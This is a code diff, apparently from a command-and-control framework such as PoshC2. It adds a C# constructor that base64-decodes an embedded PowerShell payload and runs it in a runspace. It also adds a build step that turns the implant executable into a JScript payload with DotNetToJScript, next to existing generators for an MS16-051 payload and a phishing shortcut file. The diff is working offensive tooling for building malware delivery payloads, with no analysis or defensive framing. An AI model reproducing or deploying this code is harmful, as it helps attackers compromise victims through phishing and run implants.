@@ -287,7 +287,17 @@ public class Program
 
         public const int SW_HIDE = 0;
         public const int SW_SHOW = 5;
-
+        public Program() {
+            try
+            {
+                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                InvokeAutomation(tt);
+            }
+            catch
+            {
+                Main();
+            }
+        }
         public static string InvokeAutomation(string cmd)
         {
             Runspace newrunspace = RunspaceFactory.CreateRunspace();
@@ -1215,6 +1225,11 @@ primer | iex }'
     Create-MS16-051-Payload
     CreateStandAloneExe
     CreateServiceExe
+    
+    Start-Sleep 3
+    $t = IEX "$PoshPath\DotNetToJS\DotNetToJScript.exe -c Program -o `"$global:newdir\payloads\posh.js`" `"$global:newdir\payloads\posh.exe`""|Out-Null
+    Write-Host -Object "DotNetToJS Created .js Payload written to: $global:newdir\payloads\posh.js"  -ForegroundColor Green
+    
     Write-Host -Object "Phishing .lnk Payload written to: $global:newdir\payloads\PhishingAttack-Link.lnk"  -ForegroundColor Green
 
     $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
